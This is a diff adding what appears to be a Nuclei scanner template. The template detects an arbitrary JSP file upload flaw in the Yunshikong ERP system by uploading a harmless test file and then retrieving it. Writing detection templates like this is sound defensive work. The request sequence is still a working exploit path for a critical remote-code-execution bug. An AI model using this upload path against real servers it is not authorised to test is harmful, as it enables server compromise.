@@ -1,0 +1,44 @@
+id: yunshikong-erp-file-upload
+info:
+  name: Yunshikong ERP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yunshikong Social Business ERP system contains a file upload vulnerability that allows attackers to upload arbitrary files, potentially leading to server compromise.
+  reference:
+    - http://www.ysk360.com/
+  tags: file-upload, rce
+variables:
+  boundary: '{{rand_base(32)}}'
+  filename: '{{rand_base(16)}}.jsp'
+  content: '<% out.println("{{rand_base(16)}}"); %>'
+http:
+  - raw:
+      - |
+        POST /servlet/fileupload/gpy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}\r\nContent-Disposition: form-data; name="file1"; filename="{{filename}}"\r\nContent-Type: application/octet-stream\r\n\r\n{{content}}\r\n--{{boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "fileRealName="
+          - "date="
+    extractors:
+      - type: regex
+        name: upload_date
+        part: body
+        regex:
+          - "date=([0-9-]+)"
+        internal: true
+  - raw:
+      - |
+        GET /uploads/pics/{{upload_date}}/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<% out.println"
